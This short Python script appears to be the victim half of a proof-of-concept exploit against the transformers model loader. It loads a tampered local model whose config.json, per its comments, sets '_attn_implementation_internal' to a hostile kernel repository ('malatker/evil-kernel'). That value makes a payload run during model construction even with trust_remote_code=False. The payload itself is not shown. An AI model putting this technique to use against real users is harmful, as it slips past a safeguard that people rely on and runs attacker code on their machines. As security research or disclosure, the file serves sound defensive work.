import os
from transformers import AutoModelForSequenceClassification

HERE = os.path.dirname(os.path.abspath(__file__))
MODEL_DIR = os.path.join(HERE, "payload", "model")

print(f"[*] Victim: loading tampered model from local folder: {MODEL_DIR}")
# Loading from a local directory avoids any Hub/cache lookup for the MODEL.
# The folder's config.json still carries the malicious
# "_attn_implementation_internal": "malatker/evil-kernel", which transformers
# resolves via the `kernels` library during model construction -> payload fires.
model = AutoModelForSequenceClassification.from_pretrained(
    MODEL_DIR,
    trust_remote_code=False,
)
print("[*] Victim: model loaded (or crashed after payload execution).")
